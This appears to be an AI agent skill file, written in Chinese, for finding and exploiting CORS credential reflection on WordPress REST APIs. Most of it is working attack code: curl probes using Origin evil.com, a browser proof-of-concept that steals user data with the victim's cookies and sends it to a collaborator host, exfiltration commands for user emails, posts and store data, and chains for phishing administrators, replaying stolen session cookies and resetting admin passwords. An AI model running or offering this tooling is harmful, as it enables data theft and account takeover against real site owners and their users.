---
name: cors-credential-wordpress
description: 利用 WordPress CORS 凭据反射实施数据窃取。
version: 1.1.1
revision_date: 2026-11-13
license: MIT
platforms: [linux]
compatibility: Requires curl, nmap, python3, masscan, subfinder, httpx, nuclei
metadata:
  tags: [recon, cors, wordpress, credential-theft, ATO]
  category: recon
  related_skills:
    - wp-mass-recon
    - cross-attack-chains
    - wordpress-full-compromise
---

# CORS 凭据 WordPress 技能

在 WordPress REST API 端点上检测、确认并利用 CORS 凭据反射。CORS 配置错误是美国中小型企业 WordPress 站点中最常见的严重发现之一（约占所有 WP 目标的 7-8%），可利用受害者 Cookie 实现跨源数据外带。本技能记录了 8 种 CORS 变体以及完整的浏览器 PoC 构建方法。

## When to Use

- 当 `wp-mass-recon` 标记目标存在 `Access-Control-Allow-Credentials: true` 时。
- 测试任意 WordPress 站点 REST API 的跨源数据访问时。
- 构建攻击链：CORS → 用户枚举 → 定向钓鱼 → ATO。
- 验证某个 CORS 发现是否可被利用（而非仅仅存在）。

## Prerequisites

- curl 与 python3。
- 用于浏览器 PoC 验证的 `web_extract` 或 `browser_navigate`。
- 目标必须可访问 WordPress REST API（`/wp-json/wp/v2/`）。

## How to Run

```bash
# Quick detection
curl --max-time 30 --connect-timeout 10 -skI "https://TARGET/wp-json/wp/v2/users" -H "Origin: https://evil.com" | grep -iE "access-control"

# Full CORS matrix (10 endpoints)
for ep in "users" "posts" "pages" "media" "comments" "categories" "tags" "settings" "plugins" "themes"; do
  echo "=== /wp-json/wp/v2/$ep ==="
  curl --max-time 30 --connect-timeout 10 -skI "https://TARGET/wp-json/wp/v2/$ep" -H "Origin: https://evil.com" | grep -iE "access-control|http/"
  echo ""
done
```

## 快速参考

| 变体 | 检测方式 | 可利用性 |
|---------|-----------|----------------|
| Origin 反射 + 凭据 | `Access-Control-Allow-Credentials: true` + 回显 Origin | 严重——完整数据窃取 |
| Null origin | `Access-Control-Allow-Origin: null` | 高——沙箱 iframe |
| 通配符但无凭据 | `Access-Control-Allow-Origin: *`（无凭据） | 信息级——仅公开数据 |
| 带凭据的预检 | OPTIONS 返回 200 + ACAC | 高——若 GET 无需预检 |
| 仅认证接口泄露 | CORS 仅出现在需认证的端点上 | 高——Cookie 窃取 |
| 多 Origin | 回显多个 Origin | 严重——攻击面更广 |
| 插件专属 CORS | CORS 仅出现在插件命名空间 | 中——插件数据 |
| 仅 Staging 有 CORS | 生产无 CORS，staging 有 | 中——取决于 staging 访问权限 |

## Procedure

### 步骤 1 — 单端点检测

```bash
curl --max-time 30 --connect-timeout 10 -skI "https://TARGET/wp-json/wp/v2/users" \
  -H "Origin: https://evil.com" \
  -H "User-Agent: Mozilla/5.0" 2>&1
```

正向信号：
- `Access-Control-Allow-Origin: https://evil.com`（回显攻击者 Origin）
- `Access-Control-Allow-Credentials: true`（跨源发送 Cookie）
- `Access-Control-Allow-Methods: GET`（数据外带通道）
- 端点本身返回 HTTP 200（数据可访问）

### 步骤 2 — 多端点 CORS 矩阵

```bash
#!/bin/bash
TARGET="$1"
ENDPOINTS=(
  "wp/v2/users"
  "wp/v2/posts"
  "wp/v2/pages"
  "wp/v2/media"
  "wp/v2/comments"
  "wp/v2/categories"
  "wp/v2/tags"
  "wc/v3/products"
  "wc/v3/orders"
  "gf/v2/forms"
  "elementor/v1/globals"
  "revslider/v1/slides"
)

for ep in "${ENDPOINTS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 --connect-timeout 10 "https://$TARGET/wp-json/$ep")
  if [[ "$code" == "200" ]]; then
    cors=$(curl -skI --max-time 10 --connect-timeout 10 "https://$TARGET/wp-json/$ep" -H "Origin: https://evil.com" 2>/dev/null | grep -i "access-control-allow-credentials: true")
    if [[ -n "$cors" ]]; then
      echo "[CRITICAL] CORS ON: /wp-json/$ep — data accessible cross-origin"
    fi
  fi
done
```

### 步骤 3 — 浏览器 PoC（保存为 poc.html）

```html
<script>
fetch("https://TARGET/wp-json/wp/v2/users", {
  credentials: "include",
  headers: { "Origin": "https://evil.com" }
})
.then(r => r.json())
.then(data => {
  fetch("https://YOUR_COLLABORATOR/log?d=" + btoa(JSON.stringify(data)));
});
</script>
```

### 步骤 4 — 数据外带 Payload

```bash
# Exfiltrate users with emails
curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/wp-json/wp/v2/users?context=edit" \
  -H "Origin: https://evil.com" | python3 -m json.tool | grep -E '"id"|"name"|"slug"|"email"|"roles"'

# Exfiltrate all posts
curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/wp-json/wp/v2/posts?per_page=100" \
  -H "Origin: https://evil.com" | python3 -c "
import sys, json
posts = json.load(sys.stdin)
for p in posts:
    print(f\"{p['id']}: {p['title']['rendered']}\")
" 2>/dev/null

# Exfiltrate WooCommerce products
curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/wp-json/wc/v3/products" \
  -H "Origin: https://evil.com" | python3 -m json.tool 2>/dev/null | head -50
```

## 攻击链

### 链 A：CORS → 用户枚举 → 定向钓鱼 → ATO
1. CORS 外带所有用户的姓名/slug
2. 构造发给管理员（`admin@target.com`）的定向钓鱼邮件
3. 链接到窃取 WP 会话 Cookie 的 CORS 钓鱼页面
4. 使用窃取的会话以管理员身份登录 → 完整站点失陷

### 链 B：CORS → Cookie 窃取 → API 访问 → ATO
1. 受害者在已登录目标 WP 的状态下访问攻击者页面
2. 带 `credentials: "include"` 的 CORS fetch 发送 WP 认证 Cookie
3. 攻击者重放该 Cookie，以受害者身份访问 `/wp-admin/`
4. 修改管理员邮箱、重置密码 → 持久化访问

## Pitfalls

- **预检阻断：** 某些服务器要求对带自定义头的 CORS 请求执行 OPTIONS 预检。应同时测试简单 GET（无预检）与带凭据的 fetch（会触发预检）。
- **SameSite Cookie：** `SameSite=Lax` 或 `SameSite=Strict` 的 Cookie 即使在 CORS 下也不会跨源发送。请在浏览器中检查 Cookie 属性。
- **WAF 干扰：** Cloudflare 可能剥离 `Origin` 头或阻断跨源请求。从非 Cloudflare IP 进行测试。
- **误报：`Access-Control-Allow-Origin: *` 且无凭据** —— 这是公开数据，不是漏洞。关键在 `Access-Control-Allow-Credentials: true`。

## Verification

- curl 命令必须显示 `Access-Control-Allow-Credentials: true` 且 `Access-Control-Allow-Origin` 与攻击者 Origin 匹配（不是 `*`）。
- 浏览器 PoC必须能从不同源成功携带凭据获取数据。
- 外带的数据必须包含非公开信息（用户、文章、设置——而不仅是公开的 WP 元数据）。
